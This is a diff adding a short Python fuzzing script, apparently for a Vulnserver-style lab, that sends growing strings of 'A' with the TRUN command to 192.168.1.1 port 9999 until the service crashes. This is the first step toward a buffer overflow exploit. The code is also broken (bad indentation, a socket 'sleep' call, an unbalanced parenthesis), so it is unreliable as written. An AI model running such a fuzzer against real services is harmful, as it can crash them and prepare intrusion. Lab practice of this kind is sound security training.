@@ -1,0 +1,15 @@
+buffer = "A" * 100 #a string of 100 a's
+
+while True:
+        try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #the two sockets to>
+        s.connect(('192.168.1.1', 9999)) # connect to ipv4 and port
+        s.send(('TRUN /.:/' + buffer)) # give msg trun with buffer
+        s.close # close connection
+        s.sleep(1) #sleep for a second
+        buffer = buffer + "A"*100
+
+        except: # close out program
+        print "Fuzzing crashed and %s bytes" % (str(len(buffer))
+        # will tell where the program crashed
+        sys.exit()
